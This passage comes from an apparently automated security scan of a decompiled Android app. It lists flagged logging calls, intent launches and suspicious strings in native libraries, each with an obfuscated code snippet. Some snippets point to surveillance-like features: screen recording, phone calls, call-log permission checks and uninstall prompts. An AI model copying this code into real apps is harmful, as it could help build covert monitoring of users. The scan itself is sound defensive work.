        f(printStream);
    }

```

**35. Logging Sensitive Data**
- **Description:** Pattern detected: printStackTrace
- **File:** `sources/r/r.java`
- **Line:** 238

```java
    }

    @Override // java.lang.Throwable
    public final void printStackTrace(PrintWriter printWriter) {
        f(printWriter);
    }
}
```

**36. Logging Sensitive Data**
- **Description:** Pattern detected: Log.v(
- **File:** `sources/r/k.java`
- **Line:** 145

```java
                }
            } catch (IOException | OutOfMemoryError | RuntimeException e5) {
                if (Log.isLoggable("DecodePath", 2)) {
                    Log.v("DecodePath", "Failed to decode data for " + jVar, e5);
                }
                list.add(e5);
            }
```

**37. Logging Sensitive Data**
- **Description:** Pattern detected: Log.v(
- **File:** `sources/r/m.java`
- **Line:** 204

```java
        e5.append(l0.f.a(j5));
        e5.append("ms, key: ");
        e5.append(fVar);
        Log.v("Engine", e5.toString());
    }

    /* JADX WARN: Type inference failed for: r1v0, types: [java.util.HashMap, java.util.Map<p.f, r.c$a>] */
```

**38. Logging Sensitive Data**
- **Description:** Pattern detected: Log.w(
- **File:** `sources/r0/b.java`
- **Line:** 422

```java
                StringBuilder sb3 = new StringBuilder(31);
                sb3.append("Unknown message id: ");
                sb3.append(i5);
                Log.w("GoogleApiManager", sb3.toString());
                return false;
        }
    }
```

**39. Logging Sensitive Data**
- **Description:** Pattern detected: Log.e(
- **File:** `sources/u/a.java`
- **Line:** 60

```java
                } catch (Throwable th) {
                    Objects.requireNonNull(ThreadFactoryC0069a.this);
                    if (Log.isLoggable("GlideExecutor", 6)) {
                        Log.e("GlideExecutor", "Request threw uncaught throwable", th);
                    }
                }
            }
```

**40. Logging Sensitive Data**
- **Description:** Pattern detected: System.out.print
- **File:** `sources/n/a.java`
- **Line:** 334

```java
                aVar.r();
                return aVar;
            } catch (IOException e5) {
                System.out.println("DiskLruCache " + file + " is corrupt: " + e5.getMessage() + ", removing");
                aVar.close();
                n.c.a(aVar.f4463b);
            }
```


### Intent Vulnerabilities (19 issues)

**1. Intent Vulnerabilities**
- **Description:** Pattern detected: startActivity
- **File:** `sources/k3/e.java`
- **Line:** 75

```java

        @Override // java.lang.Runnable
        public final void run() {
            this.f3868b.startActivity(this.f3869c);
        }
    }

```

**2. Intent Vulnerabilities**
- **Description:** Pattern detected: startActivity
- **File:** `sources/k3/a.java`
- **Line:** 175

```java
            intent2.addCategory("android.intent.category.LAUNCHER");
            intent2.addFlags(268435456);
            intent2.setComponent(new ComponentName(str2, str3));
            context.startActivity(intent2);
        }
    }

```

**3. Intent Vulnerabilities**
- **Description:** Pattern detected: startActivity
- **File:** `sources/f3/i.java`
- **Line:** 383

```java
                Intent intent = new Intent("android.intent.action.DELETE");
                intent.setData(Uri.parse("package:" + str));
                intent.addFlags(268435456);
                this.f2811h.startActivity(intent);
                str2 = "43";
                i.n(1, str2, null);
                return;
```

**4. Intent Vulnerabilities**
- **Description:** Pattern detected: startActivity
- **File:** `sources/f3/i.java`
- **Line:** 541

```java
                    StringBuilder g5 = androidx.activity.d.g("package:");
                    g5.append(this.f2811h.getPackageName());
                    intent.setData(Uri.parse(g5.toString()));
                    this.f2811h.startActivity(intent);
                    str = "4";
                }
                i.n(1, str, null);
```

**5. Intent Vulnerabilities**
- **Description:** Pattern detected: startActivity
- **File:** `sources/f3/i.java`
- **Line:** 587

```java
                    intent.setAction("android.intent.action.CALL");
                    intent.setData(Uri.parse(WebView.SCHEME_TEL + str));
                    intent.addFlags(268435456);
                    this.f2811h.startActivity(intent);
                    return;
                }
            } else if (ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_CALL_LOG") == 0) {
```

**6. Intent Vulnerabilities**
- **Description:** Pattern detected: startActivity
- **File:** `sources/f3/i.java`
- **Line:** 714

```java
                    p0();
                    Intent intent2 = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS", Uri.parse("package:com.android.vending"));
                    intent2.addFlags(268443648);
                    this.f2811h.startActivity(intent2);
                    i.n(1, "61", null);
                    return;
                }
```

**7. Intent Vulnerabilities**
- **Description:** Pattern detected: startActivity
- **File:** `sources/f3/i.java`
- **Line:** 731

```java
                }
            }
            intent.addFlags(268443648);
            this.f2811h.startActivity(intent);
        }

        public final void V() {
```

**8. Intent Vulnerabilities**
- **Description:** Pattern detected: startService
- **File:** `sources/f3/i.java`
- **Line:** 892

```java
            Boolean bool = Boolean.TRUE;
            BaseService.L = bool;
            if (i.f2796b) {
                this.f2811h.startService(new Intent(this.f2811h, (Class<?>) ScreenService.class).setAction("stopRecord"));
            }
            if (BaseService.f1409z || BaseService.B) {
                BaseService.f1409z = false;
```

**9. Intent Vulnerabilities**
- **Description:** Pattern detected: startService
- **File:** `sources/f3/i.java`
- **Line:** 1123

```java
        public final void c0(int i5) {
            if (i5 == 0) {
                if (i.f2796b) {
                    this.f2811h.startService(new Intent(this.f2811h, (Class<?>) ScreenService.class).setAction("stopRecord"));
                    return;
                } else {
                    i.k(false);
```

**10. Intent Vulnerabilities**
- **Description:** Pattern detected: sendBroadcast
- **File:** `sources/r/t.java`
- **Line:** 42

```java
        Intent d5 = d("CANCEL_TASK");
        d5.putExtra("component", componentName);
        d5.putExtra("tag", str);
        ((Context) this.f4976e).sendBroadcast(d5);
        return true;
    }

```

**11. Intent Vulnerabilities**
- **Description:** Pattern detected: sendBroadcast
- **File:** `sources/r/t.java`
- **Line:** 76

```java
        bundle.putLong("window_start", oneoffTask.f660k);
        bundle.putLong("window_end", oneoffTask.f661l);
        d5.putExtras(bundle);
        ((Context) this.f4976e).sendBroadcast(d5);
        return true;
    }

```

**12. Intent Vulnerabilities**
- **Description:** Pattern detected: PendingIntent
- **File:** `sources/r/t.java`
- **Line:** 3

```java
package r;

import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
```

**13. Intent Vulnerabilities**
- **Description:** Pattern detected: PendingIntent
- **File:** `sources/r/t.java`
- **Line:** 34

```java

    public /* synthetic */ t(Context context) {
        this.f4976e = context;
        this.f4977f = PendingIntent.getBroadcast(context, 0, new Intent().setPackage("com.google.example.invalidpackage"), 0);
    }

    @Override // z0.j
```

**14. Intent Vulnerabilities**
- **Description:** Pattern detected: PendingIntent
- **File:** `sources/r/t.java`
- **Line:** 87

```java
    public final Intent d(String str) {
        Intent intent = new Intent("com.google.android.gms.gcm.ACTION_SCHEDULE");
        intent.setPackage("com.google.android.gms");
        intent.putExtra("app", (PendingIntent) this.f4977f);
        intent.putExtra("source", 4);
        intent.putExtra("source_version", 12451000);
        intent.putExtra("scheduler_action", str);
```

**15. Intent Vulnerabilities**
- **Description:** Pattern detected: PendingIntent
- **File:** `sources/r0/b.java`
- **Line:** 5

```java

import android.app.ActivityManager;
import android.app.Application;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
```

**16. Intent Vulnerabilities**
- **Description:** Pattern detected: PendingIntent
- **File:** `sources/r0/b.java`
- **Line:** 197

```java
        Context context = this.f5017b;
        Objects.requireNonNull(cVar);
        int i6 = aVar.f4624c;
        PendingIntent pendingIntent = null;
        if ((i6 == 0 || aVar.f4625d == null) ? false : true) {
            pendingIntent = aVar.f4625d;
        } else {
```

**17. Intent Vulnerabilities**
- **Description:** Pattern detected: pendingIntent
- **File:** `sources/r0/b.java`
- **Line:** 197

```java
        Context context = this.f5017b;
        Objects.requireNonNull(cVar);
        int i6 = aVar.f4624c;
        PendingIntent pendingIntent = null;
        if ((i6 == 0 || aVar.f4625d == null) ? false : true) {
            pendingIntent = aVar.f4625d;
        } else {
```

**18. Intent Vulnerabilities**
- **Description:** Pattern detected: pendingIntent
- **File:** `sources/r0/b.java`
- **Line:** 199

```java
        int i6 = aVar.f4624c;
        PendingIntent pendingIntent = null;
        if ((i6 == 0 || aVar.f4625d == null) ? false : true) {
            pendingIntent = aVar.f4625d;
        } else {
            Intent a5 = cVar.a(context, i6, null);
            if (a5 != null) {
```

**19. Intent Vulnerabilities**
- **Description:** Pattern detected: pendingIntent
- **File:** `sources/r0/b.java`
- **Line:** 203

```java
        } else {
            Intent a5 = cVar.a(context, i6, null);
            if (a5 != null) {
                pendingIntent = PendingIntent.getActivity(context, 0, a5, 134217728);
            }
        }
        if (pendingIntent == null) {
```


### Native Code (37 issues)

**1. Suspicious String in Native Library**
- **Description:** Found: http
- **File:** `lib/armeabi-v7a/libshadowhook.so`

```java
String: http
```

**2. Suspicious String in Native Library**
- **Description:** Found: system
- **File:** `lib/armeabi-v7a/libshadowhook.so`

```java
String: system
```

**3. Suspicious String in Native Library**
- **Description:** Found: http
- **File:** `lib/armeabi-v7a/libhexymsb.so`

```java
String: http
```

**4. Suspicious String in Native Library**
- **Description:** Found: exec
- **File:** `lib/armeabi-v7a/libhexymsb.so`

```java
String: exec
```

**5. Suspicious String in Native Library**
- **Description:** Found: system
- **File:** `lib/armeabi-v7a/libhexymsb.so`

```java
String: system
```

**6. Suspicious String in Native Library**
- **Description:** Found: encrypt
- **File:** `lib/armeabi-v7a/libhexymsb.so`

```java
String: encrypt
```

**7. Suspicious String in Native Library**
- **Description:** Found: http
- **File:** `lib/armeabi-v7a/libpl_droidsonroids_gif.so`

```java
String: http
```

**8. Suspicious String in Native Library**
- **Description:** Found: http
- **File:** `lib/armeabi-v7a/lib6700b7c.so`

```java
String: http
```

**9. Suspicious String in Native Library**
- **Description:** Found: exec
- **File:** `lib/armeabi-v7a/lib6700b7c.so`

```java
String: exec
```

**10. Suspicious String in Native Library**
- **Description:** Found: http
- **File:** `lib/armeabi-v7a/libhumruj.so`

```java
String: http
```

**11. Suspicious String in Native Library**
- **Description:** Found: http
- **File:** `lib/x86/libhexymsb.so`

```java
String: http
```

**12. Suspicious String in Native Library**
- **Description:** Found: exec
- **File:** `lib/x86/libhexymsb.so`

```java
String: exec
```

**13. Suspicious String in Native Library**
- **Description:** Found: system
- **File:** `lib/x86/libhexymsb.so`

```java
String: system
```

**14. Suspicious String in Native Library**
- **Description:** Found: encrypt
- **File:** `lib/x86/libhexymsb.so`

```java
String: encrypt
```

**15. Suspicious String in Native Library**
- **Description:** Found: http
- **File:** `lib/x86/libpl_droidsonroids_gif.so`

```java
String: http
```

**16. Suspicious String in Native Library**
- **Description:** Found: http
- **File:** `lib/x86/lib6700b7c.so`

```java
String: http
```

**17. Suspicious String in Native Library**
- **Description:** Found: exec
- **File:** `lib/x86/lib6700b7c.so`

```java
String: exec
```

**18. Suspicious String in Native Library**
- **Description:** Found: http
- **File:** `lib/x86/libhumruj.so`

```java
String: http
```

**19. Suspicious String in Native Library**
- **Description:** Found: http
- **File:** `lib/arm64-v8a/libshadowhook.so`

```java
String: http
```

**20. Suspicious String in Native Library**
- **Description:** Found: system
- **File:** `lib/arm64-v8a/libshadowhook.so`

```java
String: system
```

**21. Suspicious String in Native Library**
- **Description:** Found: http
- **File:** `lib/arm64-v8a/libhexymsb.so`

```java
String: http
```

**22. Suspicious String in Native Library**
- **Description:** Found: exec
- **File:** `lib/arm64-v8a/libhexymsb.so`

```java
String: exec
```

**23. Suspicious String in Native Library**
- **Description:** Found: system
- **File:** `lib/arm64-v8a/libhexymsb.so`

```java
String: system
```

**24. Suspicious String in Native Library**
- **Description:** Found: encrypt
- **File:** `lib/arm64-v8a/libhexymsb.so`

```java
String: encrypt
```

**25. Suspicious String in Native Library**
- **Description:** Found: http
- **File:** `lib/arm64-v8a/libpl_droidsonroids_gif.so`

```java
String: http
```

**26. Suspicious String in Native Library**
- **Description:** Found: http
- **File:** `lib/arm64-v8a/libmy_hook.so`

```java
String: http
```

**27. Suspicious String in Native Library**
- **Description:** Found: http
- **File:** `lib/arm64-v8a/lib6700b7c.so`

```java
String: http
```

**28. Suspicious String in Native Library**
- **Description:** Found: exec
- **File:** `lib/arm64-v8a/lib6700b7c.so`

```java
String: exec
```

**29. Suspicious String in Native Library**
- **Description:** Found: http
- **File:** `lib/arm64-v8a/libhumruj.so`

```java
String: http
```

**30. Suspicious String in Native Library**
- **Description:** Found: http
- **File:** `lib/x86_64/libhexymsb.so`

```java
String: http
```

**31. Suspicious String in Native Library**
- **Description:** Found: exec
- **File:** `lib/x86_64/libhexymsb.so`

```java
String: exec
```

**32. Suspicious String in Native Library**
- **Description:** Found: system
- **File:** `lib/x86_64/libhexymsb.so`

```java
String: system
```

**33. Suspicious String in Native Library**
- **Description:** Found: encrypt
- **File:** `lib/x86_64/libhexymsb.so`

```java
String: encrypt
```

**34. Suspicious String in Native Library**
- **Description:** Found: http
- **File:** `lib/x86_64/libpl_droidsonroids_gif.so`

```java
String: http
```

**35. Suspicious String in Native Library**
- **Description:** Found: http
- **File:** `lib/x86_64/lib6700b7c.so`

```java
String: http
```

**36. Suspicious String in Native Library**
- **Description:** Found: exec
- **File:** `lib/x86_64/lib6700b7c.so`

```java
String: exec
```

**37. Suspicious String in Native Library**
- **Description:** Found: http
- **File:** `lib/x86_64/libhumruj.so`

```java
String: http
```
